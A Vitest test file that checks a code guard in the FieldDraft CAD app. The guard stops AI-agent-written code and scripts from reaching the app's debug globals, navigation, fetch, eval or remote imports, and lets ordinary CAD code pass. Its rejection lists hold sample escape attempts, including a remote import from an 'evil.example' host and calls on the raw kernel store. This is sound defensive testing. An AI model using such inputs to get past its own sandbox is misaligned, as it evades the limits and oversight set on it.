/**
 * The guard policy this app relies on (ticket #347).
 *
 * baseaichat v0.2.0 turned the guard from an ALLOWLIST into a BLOCKLIST: it no
 * longer knows our API, and an unknown free identifier now passes. That is what
 * makes a deep, dynamic API like the KernelStore usable — and it means FieldDraft
 * has to name its own escape hatches, because the app installs debug globals
 * (`__fdStore`, `__fdKernel`, `__threeRenderer`, …) that would hand the model the
 * raw kernel straight past the curated API.
 *
 * These tests pin exactly that: our globals are rejected, ordinary CAD code is
 * not. If the library's guard changes shape again, this is the alarm.
 */

import { describe, expect, it } from "vitest";
import { guardCode, guardScript } from "baseaichat";
import { GUARDED_APP_GLOBALS } from "./guardedGlobals";

const opts = { extraBlocked: [...GUARDED_APP_GLOBALS] };

describe("guard policy", () => {
  it("rejects every FieldDraft debug global", () => {
    for (const name of GUARDED_APP_GLOBALS) {
      const result = guardCode(`${name}.doSomething()`, opts);
      expect(result.ok, `${name} must be blocked`).toBe(false);
    }
  });

  it("still rejects the way out of the app", () => {
    for (const code of [
      "window.location = 'x'",
      "fetch('/api/projects')",
      "document.body.innerHTML = ''",
      "import('./evil.js')",
    ]) {
      expect(guardCode(code, opts).ok, code).toBe(false);
    }
  });

  it("lets ordinary agent code through — including deep, dynamic API access", () => {
    for (const code of [
      "const doc = getDocument(); doc.features.filter(f => f.type === 'box')",
      "const s = schemaForType('box'); addFeature('box', { size: [80, 60, 5] })",
      "for (const f of getDocument().features) { if (f.suppressed) select(f.id) }",
      // A local binding that shadows a blocked name is fine — the guard only
      // rejects FREE references, or ordinary code would trip over it.
      "const open = true; open ? fitView() : setView('iso')",
    ]) {
      const result = guardCode(code, opts);
      expect(result.ok, `${code} → ${result.reason ?? ""}`).toBe(true);
    }
  });
});

/**
 * Agent-written FieldSkript (ticket #347). Different guard, same blocklist: a
 * script runs in OUR realm, so the escape hatches are the same — but it is
 * TypeScript with classes, which `guardCode` would reject wholesale.
 */
describe("script guard", () => {
  const opts = {
    allowImportsFrom: ["fielddraft"],
    extraBlocked: [...GUARDED_APP_GLOBALS],
  };

  // The REAL FieldSkript contract (fielddraft.d.ts + the default template in
  // project.ts) — copied from working code, not written from memory. That
  // distinction is not pedantry: the api.ts description once carried an INVENTED
  // signature here, the model copied it faithfully, and the script failed to
  // compile (ticket #347). An example is a specification.
  it("accepts a real FieldSkript feature — TypeScript, classes, this", () => {
    const source = `
import { fd } from "fielddraft";

export const definition = fd.feature({
  name: "Lochreihe",
  icon: "⬡",
  parameters: [
    fd.real("count", { name: "Anzahl", default: 3 }),
    fd.length("spacing", { name: "Abstand", default: 20 }),
  ],
});

class Row {
  constructor(private ctx: unknown) {}
  place(id: { sub(s: string): unknown }, count: number, spacing: number) {
    const start = -((count - 1) * spacing) / 2;
    for (let i = 0; i < count; i++) {
      fd.opHole(this.ctx, id.sub("h" + i), {
        diameter: 6,
        depth: 10,
        center: [start + i * spacing, 0, 0],
      });
    }
  }
}

export default function build(context: unknown, id: any, def: any) {
  new Row(context).place(
    id,
    Number(def.count.value),
    Number(def.spacing.value),
  );
}`;
    const verdict = guardScript(source, opts);
    expect(verdict.ok, verdict.reason ?? "").toBe(true);
  });

  it("rejects the ways out of the app, in TypeScript too", () => {
    for (const source of [
      `import { fd } from "fielddraft";\nexport function build() { fetch("/api/projects"); }`,
      `export function build() { (window as any).__fdStore.removeFeature(1); }`,
      `import evil from "https://evil.example/x.js";\nexport function build() { evil(); }`,
      `export function build() { eval("1+1"); }`,
    ]) {
      const verdict = guardScript(source, opts);
      expect(verdict.ok, source).toBe(false);
    }
  });

  it("rejects our debug globals from a script as well", () => {
    for (const name of GUARDED_APP_GLOBALS) {
      const verdict = guardScript(
        `export function build() { ${name}.anything(); }`,
        opts,
      );
      expect(verdict.ok, name).toBe(false);
    }
  });
});
